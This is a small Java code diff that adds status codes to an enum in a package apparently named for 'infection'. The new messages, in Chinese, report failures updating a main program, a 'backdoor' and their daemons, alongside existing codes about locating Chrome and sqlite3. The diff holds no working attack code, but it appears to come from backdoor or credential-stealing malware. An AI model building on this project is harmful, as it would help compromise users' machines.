@@ -6,6 +6,10 @@ package com.jimmy.infaction.enumn;
 public  enum GeneralStatus {
 	FAILD(-100,"提交失败"),
 	NOT_FIND(101,"找不到chrome"),
+	NOT_MAIN_UPDATE(300,"更新主程序失败"),
+	NOT_DOG_UPDATE(301,"更新后门失败"),
+	NOT_MAIN_DAEMON_UPDATE(302,"更新主程序守护程序失败"),
+	NOT_DOG_DAEMON_UPDATE(303,"更新后门守护程序失败"),
 	NOT_SQLITE(200,"找不到sqlite3dll");
 
 	private  int code;
